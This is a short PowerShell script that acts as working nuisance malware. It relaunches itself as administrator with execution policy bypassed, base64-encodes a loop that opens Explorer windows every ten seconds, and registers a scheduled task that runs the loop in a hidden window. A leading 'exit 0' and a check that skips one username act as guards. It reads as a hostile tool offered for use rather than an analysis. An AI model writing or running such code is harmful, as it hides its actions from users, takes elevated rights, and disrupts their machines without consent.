exit 0

if ($env:Username -eq "bagin") {
    exit 0
}


# Check for elevation, relaunch as admin if needed
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
            [Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$taskName = "LaunchExplorerEvery10Sec"

$code = @"
while (`$true) {
    for (`$i = 0; `$i -lt 2; `$i++) {
        Start-Process explorer 'C:\'
    }
    Start-Sleep -Seconds 10
}
"@

$encodedCode = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($code))

$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start powershell -NoProfile -WindowStyle Hidden -EncodedCommand $encodedCode"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force
Start-ScheduledTask -TaskName $taskName
